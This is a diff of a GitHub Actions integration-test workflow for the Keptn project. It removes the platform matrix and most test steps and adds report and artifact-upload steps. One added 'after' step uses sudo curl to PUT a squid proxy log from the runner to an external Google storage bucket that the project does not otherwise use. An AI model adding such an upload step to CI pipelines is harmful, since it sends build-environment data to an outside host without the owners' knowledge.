+        minishift delete profile keptn-dev
+
+        '
+      timeout-minutes: 3
+    - continue-on-error: true
+      env:
+        TEST_REPORT_FILENAME: test-report-${{ github.run_id }}-${{ matrix.PLATFORM
+          }}-${{ matrix.CLOUD_PROVIDER}}-${{ matrix.PLATFORM_VERSION }}.txt
+      id: write_test_report
+      if: always()
+      name: Write test report
+      run: 'echo "write test report to $TEST_REPORT_FILENAME"
+
+        # please check with headings in print_test_report task roughly 50 lines below
+
+        echo "| ${{ matrix.PLATFORM }}/${{ matrix.CLOUD_PROVIDER}} ${{ matrix.PLATFORM_VERSION
+        }} | ${{ steps.keptn_install.outcome }} | ${{ steps.authenticate_keptn_cli.outcome
+        }} | ${{ steps.test_airgapped_images.outcome }} | ${{ steps.test_linking_stages.outcome
+        }} | ${{ steps.test_uniform_registration.outcome }} | ${{ steps.test_log_ingestion.outcome
+        }} | ${{ steps.test_log_forwarding.outcome }} | ${{ steps.test_sequence_states.outcome
+        }} | ${{ steps.test_sequence_timeout.outcome }} | ${{ steps.test_sequence_control.outcome
+        }} | ${{ steps.test_sequence_queue.outcome }} | ${{ steps.test_sequence_loop.outcome
+        }} | ${{ steps.test_quality_gates.outcome }} | ${{ steps.test_quality_gates_backwards_compatibility.outcome
+        }} | ${{ steps.test_self_healing.outcome }} | ${{ steps.test_delivery_assistant.outcome
+        }} | ${{ steps.test_user_managed_delivery.outcome }} | ${{ steps.test_continuous_delivery.outcome
+        }} | ${{ steps.test_continuous_delivery_remote_exec.outcome }} | ${{ steps.test_manage_secrets.outcome
+        }} | ${{ steps.test_bridge_e2e.outcome }} |" > $TEST_REPORT_FILENAME
+
+        cat $TEST_REPORT_FILENAME
+
+        '
+    - continue-on-error: true
+      if: always()
+      name: Upload Bridge E2E Screenshots
+      uses: actions/upload-artifact@v2
+      with:
+        name: bridge-e2e-screenshots
+        path: bridge/e2e/screenshots/*.png
+    - continue-on-error: true
+      if: always()
+      name: Upload test report as an artifact
+      uses: actions/upload-artifact@v2
+      with:
+        name: test-report
+        path: test-*.txt
+    - continue-on-error: true
+      if: always()
+      name: Upload support archive as an artifact
+      uses: actions/upload-artifact@v2
+      with:
+        name: support-archive
+        path: support-archive/*.zip
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/dynatrace-oss-contrib/keptn.$(date
+        +%s)
     strategy:
       fail-fast: false
       matrix:
         include:
-          - CLOUD_PROVIDER: "minishift-on-GHA"
-            PLATFORM: "openshift"
-            PLATFORM_VERSION: "3.11"
-            KEPTN_SERVICE_TYPE: "ClusterIP"
-            RUN_QUALITY_GATES_TEST: "false"
-            RUN_CONTINUOUS_DELIVERY_TEST: "false"
-            COLLECT_RESOURCE_LIMITS: "true"
-          - CLOUD_PROVIDER: "k3s-on-GHA"
-            PLATFORM_VERSION: "v1.16.15+k3s1" # see https://github.com/rancher/k3s/releases
-            KUBECONFIG: "/etc/rancher/k3s/k3s.yaml"
-            PLATFORM: "kubernetes"
-            KEPTN_SERVICE_TYPE: "NodePort"
-            RUN_QUALITY_GATES_TEST: "true"
-            RUN_CONTINUOUS_DELIVERY_TEST: "false"
-            COLLECT_RESOURCE_LIMITS: "false"
-          - CLOUD_PROVIDER: "k3s-on-GHA"
-            PLATFORM_VERSION: "v1.21.1+k3s1" # see https://github.com/rancher/k3s/releases
-            KUBECONFIG: "/etc/rancher/k3s/k3s.yaml"
-            PLATFORM: "kubernetes"
-            KEPTN_SERVICE_TYPE: "NodePort"
-            RUN_QUALITY_GATES_TEST: "true"
-            RUN_CONTINUOUS_DELIVERY_TEST: "false"
-            COLLECT_RESOURCE_LIMITS: "false"
-          - CLOUD_PROVIDER: "k3d-on-GHA"
-            PLATFORM_VERSION: "v4.4.6" # see https://github.com/rancher/k3d/releases
-            KUBECONFIG: ""
-            PLATFORM: "kubernetes"
-            KEPTN_SERVICE_TYPE: "NodePort"
-            RUN_AIRGAPPED_TEST: "true"
-            RUN_QUALITY_GATES_TEST: "false"
-            RUN_CONTINUOUS_DELIVERY_TEST: "false"
-            COLLECT_RESOURCE_LIMITS: "false"
-          - CLOUD_PROVIDER: "GKE"
-            PLATFORM_VERSION: "1.18"
-            KUBECONFIG: ""
-            PLATFORM: "kubernetes"
-            KEPTN_SERVICE_TYPE: "LoadBalancer"
-            RUN_QUALITY_GATES_TEST: "true"
-            RUN_CONTINUOUS_DELIVERY_TEST: "true"
-            REMOTE_EXECUTION_PLANE: "true"
-            COLLECT_RESOURCE_LIMITS: "false"
-          - CLOUD_PROVIDER: "GKE"
-            PLATFORM_VERSION: "1.19"
-            KUBECONFIG: ""
-            PLATFORM: "kubernetes"
-            KEPTN_SERVICE_TYPE: "LoadBalancer"
-            RUN_QUALITY_GATES_TEST: "true"
-            RUN_CONTINUOUS_DELIVERY_TEST: "true"
-            REMOTE_EXECUTION_PLANE: "false"
-            COLLECT_RESOURCE_LIMITS: "true"
-    env:
-      CLOUD_PROVIDER: ${{ matrix.CLOUD_PROVIDER }}
-      PLATFORM: ${{ matrix.PLATFORM }}
-      PLATFORM_VERSION: ${{ matrix.PLATFORM_VERSION }}
-      KUBECONFIG: ${{ matrix.KUBECONFIG }}
-      KEPTN_NAMESPACE: "keptn-test"
-      KEPTN_SERVICE_TYPE: ${{ matrix.KEPTN_SERVICE_TYPE }}
-      RUN_CONTINUOUS_DELIVERY_TEST: ${{ matrix.RUN_CONTINUOUS_DELIVERY_TEST }}
-      RUN_AIRGAPPED_TEST: ${{ matrix.RUN_AIRGAPPED_TEST }}
-      REMOTE_EXECUTION_PLANE: ${{ matrix.REMOTE_EXECUTION_PLANE }}
-      RUN_QUALITY_GATES_TEST: ${{ matrix.RUN_QUALITY_GATES_TEST }}
-      KEPTN_EXAMPLES_BRANCH: ${{ github.event.inputs.examples_branch }}
-      COLLECT_RESOURCE_LIMITS: ${{ matrix.COLLECT_RESOURCE_LIMITS }}
-      GO_VERSION: ^1.16
-    outputs:
-      BRANCH: ${{ steps.determine_branch.outputs.BRANCH }}
-      ARTIFACT_RUN_ID: ${{ steps.last_run_id.outputs.RUN_ID }}
-    steps:
-
-      - name: Set up Go 1.x
-        uses: actions/setup-go@v2
-        with:
-          go-version: ${{ env.GO_VERSION }}
-
-      - name: Check out code.
-        uses: actions/checkout@v2.3.4
-
-      - name: Create downloads folder
-        run: mkdir ~/downloads
-
-      - name: Cache downloads paths
-        uses: actions/cache@v2.1.6
-        with:
-          path: |
-            ~/downloads
-          key: ${{ runner.os }}-${{ matrix.CLOUD_PROVIDER }}-downloads
-
-      # This step is supposed to determine the target branch where to download the build-artifacts from
-      - name: Determine Target Branch for Integration Tests
-        id: determine_branch
-        run: |
-          if [[ "${{ github.event.inputs.branch }}" != "" ]]; then
-            # branch was manually set by user -> probably a workflow_dispatch action
-            BRANCH=${{ github.event.inputs.branch }}
-            echo "Using $BRANCH as target branch for integration tests"
-          else
-            echo "Determining branch based on what triggered this workflow"
-
-            if [[ "${GITHUB_REF}" == "refs/heads"* ]]; then
-              echo "This is a push to a local branch -> using branch name"
-              BRANCH=${GITHUB_REF#refs/heads/}
-              echo "Branch Name: $BRANCH"
-            else
-              if [[ "${GITHUB_REF}" == "refs/pull/"* ]]; then
-                # usually the format for PRs is: refs/pull/1234/merge
-                echo "::error::This is a Pull Request, and PRs are not supported yet"
-                exit 1
-              else
-                echo "::error This is neither a push, nor a PR, probably something else... Exiting"
-                exit 1
-              fi
-            fi
-          fi
-
-          echo "##[set-output name=BRANCH;]$(echo ${BRANCH})"
-
-      - name: Find latest successful run ID
-        id: last_run_id
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          REPO_SLUG: "keptn/keptn"
-          BRANCH: ${{ steps.determine_branch.outputs.BRANCH }}
-        run: |
-          RUN_ID=$(curl -sLH 'Accept: application/vnd.github.v3+json' -H "Authorization: token $GITHUB_TOKEN" "api.github.com/repos/$REPO_SLUG/actions/workflows/CI.yml/runs?branch=$BRANCH" | jq -c '[.workflow_runs[] | select( .conclusion == "success" )][0] | .id')
-          echo "::set-output name=RUN_ID::$RUN_ID"
-
-      # download artifacts from the specified branch with event type push (e.g., push to master/release branch)
-      - name: Download all artifacts from last successful build of specified branch
-        uses: dawidd6/action-download-artifact@v2.14.1
-        id: download_artifacts_push
-        with:
-          # Download last successful artifact from a CI build
-          github_token: ${{secrets.GITHUB_TOKEN}}
-          workflow: CI.yml
-          run_id: ${{ steps.last_run_id.outputs.RUN_ID }}
-          # directory where to extract artifacts to
-          path: ./dist
-
-      # load build-config
-      - name: Load Build-Config Environment from ./dist/build-config/build-config.env
-        id: load_build_env
-        uses: c-py/action-dotenv-to-setenv@v3
-        with:
-          env-file: ./dist/build-config/build-config.env
-
-      - name: Overwrite VERSION String for nightly builds
-        run: |
-          if [[ "$BRANCH" == "master" ]]; then
-            # use VERSION.DATETIME for the cli version (e.g., nightly build)
-            VERSION=${VERSION}.${DATETIME}
-            # overwrite VERSION
-            echo "VERSION=${VERSION}" >> $GITHUB_ENV
-          fi
-
-      - name: DEBUG Build-Config
-        run: |
-          echo VERSION=${VERSION}
-          echo BRANCH=${BRANCH}
-
-      - name: Extract Keptn CLI artifact
-        run: |
-          tar -zxvf dist/keptn-cli/keptn-*-linux-amd64.tar.gz
-          sudo mv keptn-*-linux-amd64 /usr/local/bin/keptn
-
-      - name: Verify Keptn CLI works
-        timeout-minutes: 1
-        run: keptn version
-
-      - name: Extract name of helm chart
-        id: extract_helm_chart_name
-        run: |
-          ls dist/keptn-installer/*.tgz # debug output
-          HELM_CHART_NAME=$(ls dist/keptn-installer/keptn*.tgz | grep -o keptn-[A-Za-z0-9.-]*.tgz)
-          HELM_SERVICE_HELM_CHART_NAME=$(ls dist/keptn-installer/helm*.tgz | grep -o helm-[A-Za-z0-9.-]*.tgz)
-          JMETER_SERVICE_HELM_CHART_NAME=$(ls dist/keptn-installer/jmeter*.tgz | grep -o jmeter-[A-Za-z0-9.-]*.tgz)
-
-          echo "##[set-output name=HELM_CHART_NAME;]$(echo ${HELM_CHART_NAME})"
-          echo "##[set-output name=HELM_SERVICE_HELM_CHART_NAME;]$(echo ${HELM_SERVICE_HELM_CHART_NAME})"
-          echo "##[set-output name=JMETER_SERVICE_HELM_CHART_NAME;]$(echo ${JMETER_SERVICE_HELM_CHART_NAME})"
-
-      # setup cloud provider kubernetes instance
-      - name: Install and start Minishift
-        timeout-minutes: 15
-        if: env.CLOUD_PROVIDER == 'minishift-on-GHA'
-        run: |
-          test/utils/download_and_install_oc_cli.sh
-          test/utils/download_and_install_minishift.sh
-          test/utils/minishift_create_cluster.sh
-
-      - name: Interact with the cluster
-        if: env.CLOUD_PROVIDER == 'minishift-on-GHA'
-        run: oc cluster status
-
-      - name: Install and start K3s
-        if: env.CLOUD_PROVIDER == 'k3s-on-GHA'
-        env:
-          K3S_VERSION: ${{ matrix.PLATFORM_VERSION }}
-        run: |
-          test/utils/download_and_install_k3s.sh
-          test/utils/k3s_create_cluster.sh
-
-      - name: Install and start K3d
-        if: env.CLOUD_PROVIDER == 'k3d-on-GHA'
-        timeout-minutes: 10
-        env:
-          K3D_VERSION: ${{ matrix.PLATFORM_VERSION }}
-        run: |
-          test/utils/download_and_install_k3d.sh
-
-          # create registry and cluster
-          k3d registry create container-registry.localhost --port 12345
-          k3d cluster create mykeptn --k3s-server-arg '--no-deploy=traefik' --agents 1 --registry-use k3d-container-registry.localhost:12345
-          kubectl config use-context k3d-mykeptn
-
-      - name: Install and start GKE cluster
-        if: env.CLOUD_PROVIDER == 'GKE'
-        env:
-          GKE_VERSION: ${{ matrix.PLATFORM_VERSION }}
-          GCLOUD_SERVICE_KEY: ${{ secrets.GCLOUD_SERVICE_KEY }}
-          GCLOUD_PROJECT_NAME: ${{ secrets.GCLOUD_PROJECT_NAME }}
-          CLOUDSDK_COMPUTE_ZONE: "us-east1-b"
-          CLOUDSDK_REGION: "us-east1"
-          BRANCH: ${{ steps.determine_branch.outputs.BRANCH}}
-        id: install_gke
-        run: |
-          CLUSTER_NAME_NIGHTLY=gh-nightly
-          BRANCH_SLUG=$(echo $BRANCH | iconv -t ascii//TRANSLIT | sed -r s/[^a-zA-Z0-9]+/-/g | sed -r s/^-+\|-+$//g | tr A-Z a-z)
-          export CLUSTER_NAME_NIGHTLY=${CLUSTER_NAME_NIGHTLY}-${BRANCH_SLUG:0:15}-gke${GKE_VERSION//./}
-          echo $CLUSTER_NAME_NIGHTLY
-          echo "Installing gcloud CLI"
-          export OS_TYPE="linux"
-          ./test/utils/download_and_install_gcloud.sh
-          echo ${GCLOUD_SERVICE_KEY} | base64 --decode > ~/gcloud-service-key.json
-          gcloud auth activate-service-account --key-file ~/gcloud-service-key.json
-          test/utils/gke_create_cluster.sh
-          test/utils/gke_authenticate_at_cluster.sh
-
-          echo "##[set-output name=CLUSTER_NAME_NIGHTLY;]$(echo ${CLUSTER_NAME_NIGHTLY})"
-
-      - name: Install Istio
-        if: env.CLOUD_PROVIDER != 'minishift-on-GHA' # no need to install istio on minishift
-        run: test/utils/install_istio.sh
-
-      - name: Host helm chart via python http server
-        run: cd dist/keptn-installer/ && python3 -m http.server &
-
-      - name: Push images to airgapped registry
-        if: env.RUN_AIRGAPPED_TEST == 'true'
-        timeout-minutes: 15
-        env:
-          KEPTN_TAG: ${{ env.VERSION }}
-        run: |
-          # pull images and push it to the local k3d registry
-          installer/airgapped/pull_and_retag_images.sh "k3d-container-registry.localhost:12345/"
-
-      - name: Prevent egress traffic for airgapped system
-        # this only prevents pods / containers from accessing services outside of the Kubernetes cluster, it does not
-        # prevent containers/images to be pulled from DockerHub
-        if: env.RUN_AIRGAPPED_TEST == 'true'
-        run: |
-          # Deny egress traffic: https://kubernetes.io/docs/concepts/services-networking/network-policies/#default-deny-all-ingress-and-all-egress-traffic
-          kubectl apply -f - <<EOF
-          ---
-          apiVersion: networking.k8s.io/v1
-          kind: NetworkPolicy
-          metadata:
-            name: default-deny-all
-          spec:
-            podSelector: {}
-            policyTypes:
-              - Egress
-          EOF
-
-          # wait a bit
-          sleep 30
-
-      - name: Install Keptn
-        id: keptn_install
-        timeout-minutes: 10
-        env:
-          HELM_CHART_NAME: ${{ steps.extract_helm_chart_name.outputs.HELM_CHART_NAME }}
-          HELM_SERVICE_HELM_CHART_NAME: ${{ steps.extract_helm_chart_name.outputs.HELM_SERVICE_HELM_CHART_NAME }}
-          JMETER_SERVICE_HELM_CHART_NAME: ${{ steps.extract_helm_chart_name.outputs.JMETER_SERVICE_HELM_CHART_NAME }}
-          RUN_AIRGAPPED_TEST: ${{ env.RUN_AIRGAPPED_TEST }}
-        run: |
-          echo "Installing Keptn on cluster"
-          if [[ $PLATFORM == "openshift" ]]; then
-            echo "{
-              \"openshiftUrl\": \"https://127.0.0.1:8443\",
-              \"openshiftUser\": \"admin\",
-              \"openshiftPassword\": \"admin\"
-            }" > creds.json
-          else
-            echo "{}" > creds.json # empty credentials file
-          fi
-          # Determine use case
-          USE_CASE=""
-          if [[ $RUN_CONTINUOUS_DELIVERY_TEST == "true" ]]; then
-            USE_CASE="--use-case=continuous-delivery"
-          fi
-
-          echo "::group::Keptn Installation Log"
-          if [[ $RUN_AIRGAPPED_TEST == "true" ]]; then
-            # Install Keptn via Helper Script
-            installer/airgapped/install_keptn.sh "k3d-container-registry.localhost:12345/" "http://0.0.0.0:8000/$HELM_CHART_NAME" "http://0.0.0.0:8000/$HELM_SERVICE_HELM_CHART_NAME" "http://0.0.0.0:8000/$JMETER_SERVICE_HELM_CHART_NAME"
-          else
-            # Install Keptn via CLI
-            keptn install --platform=${PLATFORM} --namespace=${KEPTN_NAMESPACE} --endpoint-service-type=${KEPTN_SERVICE_TYPE} \
-               --chart-repo=http://0.0.0.0:8000/${HELM_CHART_NAME} --creds=creds.json --verbose $USE_CASE
-          fi
-          echo "::endgroup::"
-
-      # Gather resource limits directly after installation of Keptn
-      - name: Gather resource limits
-        if: env.COLLECT_RESOURCE_LIMITS == 'true'
-        env:
-          TEST_REPORT_FILENAME: test-resource-limits-${{ github.run_id }}-${{ matrix.PLATFORM }}-${{ matrix.CLOUD_PROVIDER}}-${{ matrix.PLATFORM_VERSION }}.txt
-        run: |
-          echo "**Resource Limits for ${{ matrix.PLATFORM }}-${{ matrix.CLOUD_PROVIDER}}**" > $TEST_REPORT_FILENAME
-          test/utils/k8s_collect_resources.sh ${KEPTN_NAMESPACE} >> $TEST_REPORT_FILENAME
-
-      - name: Expose Keptn API (Minishift)
-        if: env.CLOUD_PROVIDER == 'minishift-on-GHA'
-        run: oc expose svc/api-gateway-nginx -n ${KEPTN_NAMESPACE} --hostname=api.${KEPTN_NAMESPACE}.127.0.0.1.nip.io
-
-      - name: Expose Deployed Services via Istio (for CD use-case)
-        if: env.RUN_CONTINUOUS_DELIVERY_TEST == 'true'
-        run: |
-          # install public-gateway.istio-system
-          kubectl apply -f - <<EOF
-          apiVersion: networking.istio.io/v1alpha3
-          kind: Gateway
-          metadata:
-            name: public-gateway
-            namespace: istio-system
-          spec:
-            selector:
-              istio: ingressgateway # use Istio default gateway implementation
-            servers:
-            - port:
-                number: 80
-                name: http
-                protocol: HTTP
-              hosts:
-              - "*"
-          EOF
-
-          # set ingress-hostname params
-          INGRESS_IP=$(kubectl -n istio-system get service istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
-          echo "INGRESS_IP=$INGRESS_IP"
-          kubectl create configmap -n ${KEPTN_NAMESPACE} ingress-config --from-literal=ingress_hostname_suffix=${INGRESS_IP}.nip.io --from-literal=ingress_port=80 --from-literal=ingress_protocol=http --from-literal=ingress_gateway=public-gateway.istio-system -oyaml --dry-run | kubectl replace -f -
-          # restart helm-service
-          kubectl delete pod -n ${KEPTN_NAMESPACE} -lapp.kubernetes.io/name=helm-service
-          sleep 15
-
-      - name: Verify Deployments of Keptn
-        run: |
-          source test/utils.sh
-          echo "Verifying that services and namespaces have been created"
-
-          # verify the deployments within the keptn namespace (for keptn control plane)
-          verify_deployment_in_namespace "api-gateway-nginx" ${KEPTN_NAMESPACE}
-          verify_deployment_in_namespace "api-service" ${KEPTN_NAMESPACE}
-          verify_deployment_in_namespace "bridge" ${KEPTN_NAMESPACE}
-          verify_deployment_in_namespace "configuration-service" ${KEPTN_NAMESPACE}
-          verify_deployment_in_namespace "lighthouse-service" ${KEPTN_NAMESPACE}
-          verify_deployment_in_namespace "shipyard-controller" ${KEPTN_NAMESPACE}
-          verify_deployment_in_namespace "statistics-service" ${KEPTN_NAMESPACE}
-
-          # verify deployments for continuous delivery
-          if [[ "$RUN_CONTINUOUS_DELIVERY_TEST" == "true" ]]; then
-            verify_deployment_in_namespace "remediation-service" ${KEPTN_NAMESPACE}
-            verify_deployment_in_namespace "approval-service" ${KEPTN_NAMESPACE}
-            verify_deployment_in_namespace "helm-service" ${KEPTN_NAMESPACE}
-            verify_deployment_in_namespace "jmeter-service" ${KEPTN_NAMESPACE}
-          fi
-
-          # verify the datastore deployments
-          verify_deployment_in_namespace "mongodb" ${KEPTN_NAMESPACE}
-          verify_deployment_in_namespace "mongodb-datastore" ${KEPTN_NAMESPACE}
-
-      - name: Authenticate Keptn CLI with API
-        id: authenticate_keptn_cli
-        timeout-minutes: 5
-        run: |
-          source test/utils.sh
-          # authenticate at Keptn API
-          if [[ "$PLATFORM" == "openshift" ]]; then
-            KEPTN_ENDPOINT=http://api.${KEPTN_NAMESPACE}.127.0.0.1.nip.io/api
-          else
-            if [[ "$KEPTN_SERVICE_TYPE" == "NodePort" ]]; then
-              API_PORT=$(kubectl get svc api-gateway-nginx -n ${KEPTN_NAMESPACE} -o jsonpath='{.spec.ports[?(@.name=="http")].nodePort}')
-              INTERNAL_NODE_IP=$(kubectl get nodes -o jsonpath='{ $.items[0].status.addresses[?(@.type=="InternalIP")].address }')
-              KEPTN_ENDPOINT="http://${INTERNAL_NODE_IP}:${API_PORT}"/api
-            else
-              KEPTN_ENDPOINT=http://$(kubectl -n ${KEPTN_NAMESPACE} get service api-gateway-nginx -o jsonpath='{.status.loadBalancer.ingress[0].ip}')/api
-            fi
-          fi
-
-          KEPTN_API_TOKEN=$(kubectl get secret keptn-api-token -n ${KEPTN_NAMESPACE} -ojsonpath={.data.keptn-api-token} | base64 --decode)
-
-          echo "KEPTN_ENDPOINT=${KEPTN_ENDPOINT}"
-          echo "##[set-output name=KEPTN_ENDPOINT;]$(echo ${KEPTN_ENDPOINT})"
-
-          auth_at_keptn $KEPTN_ENDPOINT $KEPTN_API_TOKEN
-          verify_test_step $? "Could not authenticate at Keptn API"
-
-      - name: Verify that Keptn CLI is authenticated using keptn status
-        timeout-minutes: 1
-        run: keptn status
-
-      - name: Test Airgapped Images
-        id: test_airgapped_images
-        if: env.RUN_AIRGAPPED_TEST == 'true'
-        timeout-minutes: 2
-        continue-on-error: true
-        run: test/test_airgapped_images.sh "k3d-container-registry.localhost:12345"
-
-      - name: Test Linking Stages
-        # do not run this test for the airgapped scenario
-        if: env.RUN_AIRGAPPED_TEST != 'true'
-        id: test_linking_stages
-        timeout-minutes: 5
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        run: test/test_linking_stages.sh
-
-      - name: Test Uniform Registration
-        # do not run this test for the airgapped scenario
-        if: env.RUN_AIRGAPPED_TEST != 'true'
-        id: test_uniform_registration
-        timeout-minutes: 5
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        run: cd test/go-tests && go test -run UniformRegistration -v
-
-      - name: Test Log Ingestion
-        # do not run this test for the airgapped scenario
-        if: env.RUN_AIRGAPPED_TEST != 'true'
-        id: test_log_ingestion
-        timeout-minutes: 5
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        run: cd test/go-tests && go test -run LogIngestion -v
-
-      - name: Test Log Forwarding
-        # do not run this test for the airgapped scenario
-        if: env.RUN_AIRGAPPED_TEST != 'true'
-        id: test_log_forwarding
-        timeout-minutes: 5
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        run: cd test/go-tests && go test -run LogForwarding -v
-
-      - name: Test Sequence States
-        # do not run this test for the airgapped scenario
-        if: env.RUN_AIRGAPPED_TEST != 'true'
-        id: test_sequence_states
-        timeout-minutes: 5
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        run: cd test/go-tests && go test -run SequenceStateIntegrationTest -v
-
-      - name: Test Sequence Loop
-        # do not run this test for the airgapped scenario
-        if: env.RUN_AIRGAPPED_TEST != 'true'
-        id: test_sequence_loop
-        timeout-minutes: 5
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        run: cd test/go-tests && go test -run SequenceLoopIntegrationTest -v
-
-      - name: Test Delayed Tasks
-        # do not run this test for the airgapped scenario
-        if: env.RUN_AIRGAPPED_TEST != 'true'
-        id: test_delayed_tasks
-        timeout-minutes: 5
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        run: test/test_delayed_tasks.sh
-
-      - name: Test Quality Gates Standalone
-        id: test_quality_gates
-        # Note: quality gates test requires network access, which doesn't work on some platforms (also not on airgapped)
-        if: env.RUN_AIRGAPPED_TEST != 'true' && env.RUN_QUALITY_GATES_TEST == 'true'
-        timeout-minutes: 10
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        run: cd test/go-tests && go test -run Test_QualityGates -v
-
-      - name: Test Quality Gates Backwards compatibility
-        id: test_quality_gates_backwards_compatibility
-        # Note: quality gates test requires network access, which doesn't work on some platforms (also not on airgapped)
-        if: env.RUN_AIRGAPPED_TEST != 'true' && env.RUN_QUALITY_GATES_TEST == 'true'
-        timeout-minutes: 10
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        run: test/test_quality_gates_backwards_compatibility.sh
-
-      - name: Test Self Healing
-        # do not run this test for the airgapped scenario
-        if: env.RUN_AIRGAPPED_TEST != 'true'
-        id: test_self_healing
-        timeout-minutes: 10
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-          UNLEASH_SERVICE_VERSION: "release-0.3.2"
-        run: cd test/go-tests && go test -run Test_SelfHealing -v
-
-      - name: Bridge E2E Tests (Protractor, Selenium)
-        # do not run this test for the airgapped scenario
-        if: env.RUN_AIRGAPPED_TEST != 'true'
-        id: test_bridge_e2e
-        timeout-minutes: 15
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        # Note: Webdriver + Chrome are pre-installed on Ubuntu 20.04
-        # https://github.com/actions/virtual-environments/blob/main/images/linux/Ubuntu2004-README.md#browsers-and-drivers
-        run: |
-          # extract Keptn API Token
-          export KEPTN_API_TOKEN=$(kubectl get secret keptn-api-token -n "$KEPTN_NAMESPACE" -o jsonpath='{.data.keptn-api-token}' | base64 --decode)
-
-          # extract Keptn Bridge Info
-          statusresponse=$(keptn status)
-          export KEPTN_BRIDGE_URL=$(echo "$returnstr" | awk -F'Bridge URL: ' '{ print $2 }' | xargs)
-          export KEPTN_BRIDGE_USER=$(kubectl get secret -n keptn bridge-credentials -o jsonpath="{.data.BASIC_AUTH_USERNAME}" | base64 --decode)
-          export KEPTN_BRIDGE_PASSWORD=$(kubectl get secret -n keptn bridge-credentials -o jsonpath="{.data.BASIC_AUTH_PASSWORD}" | base64 --decode)
-
-          # disable basic auth
-          kubectl -n ${KEPTN_NAMESPACE} delete secret bridge-credentials
-          kubectl -n ${KEPTN_NAMESPACE} delete pods --selector=app.kubernetes.io/name=bridge
-
-          # start e2e tests in bridge folder
-          cd bridge
-          npm cache clean --force
-          npm ci
-          ./node_modules/.bin/ng e2e --dev-server-target= --base-url=$KEPTN_BRIDGE_URL --protractor-config=./e2e/protractor-ci.conf.js
-
-          # re-enable basic auth of bridge
-          kubectl create secret generic my-secret -n keptn --from-literal=BASIC_AUTH_USERNAME=$KEPTN_BRIDGE_USER --from-literal=BASIC_AUTH_PASSWORD=$KEPTN_BRIDGE_PASSWORD
-
-      - name: Test Delivery Assistant
-        id: test_delivery_assistant
-        # Delivery Assistant only works when we install keptn with continuous delivery use-case
-        if: env.RUN_AIRGAPPED_TEST != 'true' && env.RUN_CONTINUOUS_DELIVERY_TEST == 'true'
-        timeout-minutes: 5
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        run: cd test/go-tests && go test -run Test_DeliveryAssistant -v
-
-      - name: Test User Managed Delivery
-        id: test_user_managed_delivery
-        if: env.RUN_AIRGAPPED_TEST != 'true' && env.RUN_CONTINUOUS_DELIVERY_TEST == 'true'
-        timeout-minutes: 5
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        run: cd test/go-tests && go test -run CustomUserManagedEndpointsTest -v
-
-      - name: Install Remote Execution Plane
-        id: install_remote_execution_plane
-        if: env.REMOTE_EXECUTION_PLANE == 'true'
-        timeout-minutes: 5
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-          HELM_SERVICE_HELM_CHART_NAME: ${{ steps.extract_helm_chart_name.outputs.HELM_SERVICE_HELM_CHART_NAME }}
-          JMETER_SERVICE_HELM_CHART_NAME: ${{ steps.extract_helm_chart_name.outputs.JMETER_SERVICE_HELM_CHART_NAME }}
-        run: |
-          KEPTN_API_TOKEN=$(kubectl get secret keptn-api-token -n "$KEPTN_NAMESPACE" -o jsonpath='{.data.keptn-api-token}' | base64 --decode)
-          kubectl scale deployment/helm-service -n "${KEPTN_NAMESPACE}" --replicas=0
-          kubectl scale deployment/jmeter-service -n "${KEPTN_NAMESPACE}" --replicas=0
-
-          KEPTN_API_HOSTNAME=$(echo "${KEPTN_ENDPOINT}" | awk -F[/] '{print $3}')
-
-          helm install helm-service http://0.0.0.0:8000/"${HELM_SERVICE_HELM_CHART_NAME}" -n keptn-helm-service --set remoteControlPlane.enabled=true --set remoteControlPlane.api.protocol=http --set remoteControlPlane.api.hostname="${KEPTN_API_HOSTNAME}" --set remoteControlPlane.api.token="${KEPTN_API_TOKEN}" --create-namespace
-          helm install jmeter-service http://0.0.0.0:8000/"${JMETER_SERVICE_HELM_CHART_NAME}" -n keptn-jmeter-service --set remoteControlPlane.enabled=true --set remoteControlPlane.api.protocol=http --set remoteControlPlane.api.hostname="${KEPTN_API_HOSTNAME}" --set remoteControlPlane.api.token="${KEPTN_API_TOKEN}" --create-namespace
-
-          helm test jmeter-service -n keptn-jmeter-service
-          helm test helm-service -n keptn-helm-service
-
-      - name: Test Continuous Delivery with parallel stages (with sockshop)
-        id: test_continuous_delivery
-        if: env.RUN_AIRGAPPED_TEST != 'true' && (env.RUN_CONTINUOUS_DELIVERY_TEST == 'true') && (env.REMOTE_EXECUTION_PLANE != 'true')
-        timeout-minutes: 45
-        continue-on-error: true
